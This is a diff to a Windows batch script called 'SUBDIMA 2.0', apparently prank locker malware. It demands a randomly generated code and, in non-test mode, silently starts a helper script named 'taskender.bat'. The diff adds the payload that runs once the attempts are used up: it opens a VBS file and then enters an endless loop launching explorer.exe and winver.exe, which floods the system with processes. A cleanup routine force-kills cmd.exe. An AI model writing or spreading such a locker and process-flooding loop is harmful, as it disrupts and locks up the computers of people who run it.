@@ -8,7 +8,10 @@
 @echo off
 title SUBDIMA 2.0
 echo %* | findstr /I "tstmd"
-if /I "%errorlevel%" == "0" set test=1 && title SubDima 2.0 (TEST MODE)
+if /I "%errorlevel%" == "0" (
+set test=1
+title SubDima 2.0 TEST MODE
+)
 if /I "%errorlevel%" == "1" set test=0
 if /I "%1" == "about" goto :about
 if /I "%1" == "init" goto :firstinit
@@ -53,7 +56,7 @@ exit
 :firstinit
 echo Preparing first initialization...
 set attempts=3
-if /I "%test%" == "0" start "" /min "%tmp%\SUBDIMA\taskender.bat"
+if /I "%test%" == "0" start "" /min "%tmp%\SUBDIMA\taskender.bat" strt
 echo Generating random key...
 set key=%random%
 cls
@@ -104,15 +107,15 @@ goto :code
 
 :noattempts
 cls
-echo. I'm sorry.. You entered the wrong code too many times.
-echo. Seems like you're fucked...
-timeout /t 2 /nobreak > nul
-::if /I "%test%" == "0" (
-    ::payload
-::)
-timeout /t 3 /nobreak > nul
+start "" "%tmp%\SUBDIMA\notepad.vbs"
+timeout /t 5 /nobreak > nul
+if /I "%test%" == "0" goto :payload
+if /I "%test%" == "1" (
 goto :remove
-exit
+)
+echo tf how did you get here
+pause
+goto :remove
 
 :unlock
 cls
@@ -126,3 +129,8 @@ goto :remove
 :remove
 powershell "taskkill -im cmd.exe /f; rd /S /Q "%tmp%\SUBDIMA; explorer.exe"
 exit
+
+:payload
+explorer.exe
+winver.exe
+goto :payload
